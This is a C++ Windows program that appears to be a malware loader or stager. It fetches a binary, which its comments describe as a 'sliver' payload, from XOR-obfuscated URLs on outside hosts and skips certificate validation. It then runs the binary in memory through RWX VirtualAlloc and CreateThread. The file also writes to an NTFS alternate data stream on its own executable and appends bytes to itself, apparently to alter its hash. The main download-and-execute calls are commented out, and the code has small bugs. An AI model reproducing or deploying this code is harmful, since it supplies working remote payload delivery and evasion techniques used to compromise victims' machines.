#include <windows.h>
#include <iostream>
#include <iomanip>
#include <string>
#include <sstream>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

// Function to download file content into memory
BYTE* DownloadFileToMemory(LPCWSTR urlPrimary, LPCWSTR urlSecondary, DWORD* outSize) {
    HINTERNET hInternet = InternetOpen(L"WinHTTP", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed.\n");
        return NULL;
    }

    HINTERNET hUrl = InternetOpenUrl(hInternet, urlPrimary, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hUrl) {
        printf("InternetOpenUrl failed.\n");
        InternetCloseHandle(hInternet);
        HINTERNET hUrl = InternetOpenUrl(hInternet, urlSecondary, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            return NULL;
        }
    }



    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    DWORD bufferSize = 1024;
    BYTE* buffer = (BYTE*)malloc(bufferSize);
    BYTE* memoryBuffer = NULL;

    if (!buffer) {
        printf("Memory allocation failed.\n");
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    // Read the file into memory
    do {
        if (!InternetReadFile(hUrl, buffer, bufferSize, &bytesRead)) {
            printf("InternetReadFile failed.\n");
            free(buffer);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return NULL;
        }

        if (bytesRead > 0) {
            BYTE* tempBuffer = (BYTE*)realloc(memoryBuffer, totalBytesRead + bytesRead);
            if (!tempBuffer) {
                printf("Reallocation failed.\n");
                free(buffer);
                free(memoryBuffer);
                InternetCloseHandle(hUrl);
                InternetCloseHandle(hInternet);
                return NULL;
            }

            memoryBuffer = tempBuffer;
            memcpy(memoryBuffer + totalBytesRead, buffer, bytesRead);
            totalBytesRead += bytesRead;
        }
    } while (bytesRead > 0);

    free(buffer);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    *outSize = totalBytesRead;
    return memoryBuffer;
}

// Function to execute the binary in memory
BOOL ExecuteBinaryFromMemory(BYTE* binaryData, DWORD binarySize) {
    // Step 1: Allocate memory for the binary data using VirtualAlloc
    PVOID shellcode_exec = VirtualAlloc(NULL, binarySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode_exec) {
        std::wcout << L"VirtualAlloc failed with error: " << GetLastError() << std::endl;
        return FALSE;
    }

    // Step 2: Copy the binary data into the allocated memory
    RtlCopyMemory(shellcode_exec, binaryData, binarySize);

    // Step 3: Create a thread to execute the shellcode
    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    if (!hThread) {
        std::wcout << L"CreateThread failed with error: " << GetLastError() << std::endl;
        VirtualFree(shellcode_exec, 0, MEM_RELEASE);
        return FALSE;
    }

    // Step 4: Wait for the thread to finish execution
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFree(shellcode_exec, 0, MEM_RELEASE);

    return TRUE;
}

std::wstring xS(const std::wstring& input, wchar_t key) {

    std::wstring output = input;
    for (size_t i = 0; i < output.length(); ++i) {
        output[i] ^= key; 
    }
    return output;

}

std::wstring PrintSystemTime(const SYSTEMTIME& time) {
    std::wstringstream wss;

    // Build the string with date and time in a readable format
    wss << std::setfill(L'0') << std::setw(2) << time.wHour << L":"
        << std::setw(2) << time.wMinute << L":"
        << std::setw(2) << time.wSecond << L"."
        << std::setw(3) << time.wMilliseconds << L" "
        << std::setw(4) << time.wYear << L"-"
        << std::setw(2) << time.wMonth << L"-"
        << std::setw(2) << time.wDay;

    // Return the built string
    return wss.str();
}

int main() {
    // Payload-Primary for grabbing loader - brazilsports.org, Payload-Secondary for backup - sportcrate.org
    // Payload-Primary for grabbing sliver - brazilsports.org, Payload-Secondary for backup - sportcrate.org
    //std::wstring original_url_primary = L"iuuq;..3/35/2/044;9191.G`mbnor/dyd";
    std::wstring original_url_primary = L"iuuqr;..cs`{hmrqnsur/nsf.ud`lr.G`mbnor/dyd";
    std::wstring original_url_secondary = L"iuuqr;..rqnsubs`ud/nsf.ud`lr.G`mbnor/dyd";

    wchar_t k = 1;
    //std::wstring url = L"http://2.24.3.155:8080/Falcons.exe";
    std::wstring urlPrimary = xS(original_url_primary, k);
    std::wstring urlSecondary = xS(original_url_primary, k);
    DWORD fileSize = 0;

    /*
    // Download the file into memory
    BYTE* fileData = DownloadFileToMemory(urlPrimary.c_str(), urlSecondary.c_str(), &fileSize);
    if (!fileData) {
        printf("Failed to download file.\n");
        return 1;
    }

    // Execute the file from memory
    if (!ExecuteBinaryFromMemory(fileData, fileSize)) {
        printf("Failed to execute binary.\n");
        free(fileData);
        std::cout << GetLastError() << std::endl;
        return 1;
    }
    */

    wchar_t procName[MAX_PATH];
    DWORD res = 0;
    res = GetModuleFileNameW(NULL, procName, MAX_PATH);

    if (res == 0) {
        std::wcerr << L"Failed to retrieve the module file name. Error: " << GetLastError() << std::endl;
        return 1;

    }

    std::wstring executablePath(procName);

    std::wcout << L"Name: " << executablePath << std::endl;

    std::wstring streamName = L":mystream";

    // Full path including the alternate data stream
    std::wstring fullPath = executablePath + streamName;

    SYSTEMTIME localTime;
    GetLocalTime(&localTime);

    std::wstring data = PrintSystemTime(localTime);

    HANDLE hFile = CreateFileW(
        fullPath.c_str(),          // File name (including ADS)
        GENERIC_WRITE,             // Open for writing
        FILE_SHARE_READ | FILE_SHARE_WRITE, // Allow sharing for read and write access
        NULL,                      // Default security
        CREATE_ALWAYS,             // Always create a new stream or overwrite if it exists
        FILE_ATTRIBUTE_NORMAL,     // Normal file attributes
        NULL                       // No template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to open or create the alternate data stream. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Step 5: Write data (wstring) to the alternate data stream
    DWORD bytesWritten;
    if (!WriteFile(hFile, data.c_str(), data.size() * sizeof(wchar_t), &bytesWritten, NULL)) {
        std::wcerr << L"Failed to write to the alternate data stream. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    std::wcout << L"Successfully wrote to the alternate data stream!" << std::endl;

    // Close the handle after writing
    CloseHandle(hFile);

    // Step 6: Reopen the alternate data stream for reading
    hFile = CreateFileW(
        fullPath.c_str(),          // File name (including ADS)
        GENERIC_READ,              // Open for reading
        FILE_SHARE_READ | FILE_SHARE_WRITE, // Allow sharing for read and write access
        NULL,                      // Default security
        OPEN_EXISTING,             // Open existing stream
        FILE_ATTRIBUTE_NORMAL,     // Normal file attributes
        NULL                       // No template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to open the alternate data stream for reading. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Step 7: Buffer to read data from the stream
    wchar_t buffer[256];  // Must match the wide-character type
    DWORD bytesRead;

    // Step 8: Read data from the alternate data stream
    if (!ReadFile(hFile, buffer, sizeof(buffer) - sizeof(wchar_t), &bytesRead, NULL)) {
        std::wcerr << L"Failed to read from the alternate data stream. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    // Null-terminate the read data
    buffer[bytesRead / sizeof(wchar_t)] = L'\0';

    std::wcout << L"Data read from the alternate data stream: " << buffer << std::endl;

    // Close the handle after reading
    CloseHandle(hFile);

    HANDLE hBinFile = CreateFileW(
        executablePath.c_str(),          // File path
        FILE_APPEND_DATA,                // Append data to the file
        FILE_SHARE_READ | FILE_SHARE_WRITE, // Allow read/write sharing
        NULL,                            // Default security
        OPEN_EXISTING,                   // Open the existing file
        FILE_ATTRIBUTE_NORMAL,           // Normal file attributes
        NULL                             // No template file
    );

    if (hBinFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to open the file. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Step 2: Move the file pointer to the end of the file (not necessary with FILE_APPEND_DATA, but showing for clarity)
    SetFilePointer(hBinFile, 0, NULL, FILE_END);

    // Step 3: Prepare null bytes to append
    const int nullByteCount = 10; // Number of null bytes to append
    char nullBytes[nullByteCount] = { 0 }; // Array of null bytes

    // Step 4: Write null bytes to the file
    DWORD bytesWrittenIn;
    if (!WriteFile(hBinFile, nullBytes, nullByteCount, &bytesWrittenIn, NULL)) {
        std::wcerr << L"Failed to write null bytes to the file. Error: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    std::wcout << L"Successfully appended " << bytesWrittenIn << L" null bytes to the file." << std::endl;

    // Step 5: Close the file handle
    CloseHandle(hBinFile);




    return 1337;


    // Clean up
    //free(fileData);
    return 0;
}
